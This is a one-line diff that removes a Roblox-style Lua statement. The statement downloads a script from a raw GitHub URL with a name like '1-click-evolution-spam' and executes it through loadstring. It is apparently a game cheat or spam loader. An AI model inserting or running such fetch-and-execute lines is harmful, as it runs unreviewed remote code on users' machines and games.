@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/1-click-evolution-spam7-bhaa3xh4o67uc9.lua"))()
